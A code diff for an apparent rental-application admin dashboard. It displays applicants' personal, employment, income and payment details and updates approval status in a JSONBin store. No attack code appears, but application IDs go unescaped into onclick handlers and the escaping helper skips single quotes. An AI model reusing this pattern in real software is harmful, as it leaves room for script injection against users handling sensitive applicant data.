+          <div class="app-detail-item"><div class="app-detail-label">Date of Birth</div><div class="app-detail-val">${escHtml(app.dob)}</div></div>
+          <div class="app-detail-item"><div class="app-detail-label">License/ID</div><div class="app-detail-val">${escHtml(app.license)}</div></div>
+          <div class="app-detail-item"><div class="app-detail-label">Address</div><div class="app-detail-val">${escHtml(app.streetAddress)}, ${escHtml(app.city)}, ${escHtml(app.state)} ${escHtml(app.zip)}</div></div>
+          <div class="app-detail-item"><div class="app-detail-label">Employer</div><div class="app-detail-val">${escHtml(app.employerName)} — ${escHtml(app.jobTitle)}</div></div>
+          <div class="app-detail-item"><div class="app-detail-label">Monthly Income</div><div class="app-detail-val">${escHtml(app.monthlyIncome)}</div></div>
+          <div class="app-detail-item"><div class="app-detail-label">Supervisor</div><div class="app-detail-val">${escHtml(app.supervisorName)} (${escHtml(app.supervisorContact)})</div></div>
+          <div class="app-detail-item"><div class="app-detail-label">Prev. Landlord</div><div class="app-detail-val">${escHtml(app.prevLandlord)} — ${escHtml(app.landlordContact)}</div></div>
+          <div class="app-detail-item"><div class="app-detail-label">Prev. Rent</div><div class="app-detail-val">${escHtml(app.prevRent)} (${escHtml(app.tenancyDates)})</div></div>
+          <div class="app-detail-item"><div class="app-detail-label">Occupants / Pets</div><div class="app-detail-val">${escHtml(app.occupants)} occupant(s), Pets: ${escHtml(app.pets)}</div></div>
+          <div class="app-detail-item"><div class="app-detail-label">Emergency Contact</div><div class="app-detail-val">${escHtml(app.emergencyContact)}</div></div>
+          <div class="app-detail-item"><div class="app-detail-label">Payment Method</div><div class="app-detail-val">${escHtml(app.payMethod)}</div></div>
+          <div class="app-detail-item"><div class="app-detail-label">Payment Ref</div><div class="app-detail-val" style="word-break:break-all;font-size:0.78rem">${escHtml(app.payRef)}</div></div>
         </div>
+        ${app.reasonLeaving && app.reasonLeaving !== '—' ? `<div style="margin-bottom:14px"><div class="app-detail-label" style="margin-bottom:4px">Reason for Leaving</div><div class="app-detail-val">${escHtml(app.reasonLeaving)}</div></div>` : ''}
         ${app.status === 'pending' ? `
         <div class="app-actions">
-          <button class="btn-approve" onclick="updateApp('${app.id}','approved')">✓ Approve Application</button>
-          <button class="btn-reject" onclick="updateApp('${app.id}','rejected')">✗ Reject Application</button>
+          <button class="btn-approve" onclick="updateAppStatus('${app.id}','approved')">✓ Approve Application</button>
+          <button class="btn-reject" onclick="updateAppStatus('${app.id}','rejected')">✗ Reject Application</button>
         </div>` : `<div style="font-size:0.82rem;color:rgba(255,255,255,0.35)">No further actions available.</div>`}
       </div>
     `).join('');
-    renderLogs();
   }
 
-  function updateApp(id, status) {
-    const app = apps.find(a => a.id === id);
-    if (!app) return;
-    app.status = status;
-    addLog('action', `Application ${id} (${app.name}) marked as ${status}`);
-    renderDashboard();
+  // =============================================
+  // Update application status in JSONBin
+  // =============================================
+  async function updateAppStatus(id, status) {
+    const approveBtn = document.querySelector(`#card-${id} .btn-approve`);
+    const rejectBtn = document.querySelector(`#card-${id} .btn-reject`);
+    if (approveBtn) approveBtn.disabled = true;
+    if (rejectBtn) rejectBtn.disabled = true;
+
+    try {
+      const record = await fetchBin();
+      const apps = record.submissions || [];
+      const app = apps.find(a => a.id === id);
+      if (!app) throw new Error('Application not found');
+      app.status = status;
+      await updateBin({ ...record, submissions: apps });
+      addLog('action', `Application ${id} (${app.name}) marked as ${status}`);
+      showToast(`Application ${status === 'approved' ? '✓ Approved' : '✗ Rejected'}`, status === 'approved' ? 'success' : 'error');
+      renderDashboard(apps);
+    } catch (err) {
+      addLog('error', `Failed to update ${id}: ${err.message}`);
+      showToast('Update failed. Please try again.', 'error');
+      if (approveBtn) approveBtn.disabled = false;
+      if (rejectBtn) rejectBtn.disabled = false;
+    }
+  }
+
+  // =============================================
+  // Utility
+  // =============================================
+  function escHtml(str) {
+    if (!str) return '—';
+    return String(str).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
   }
 </script>
 </body>
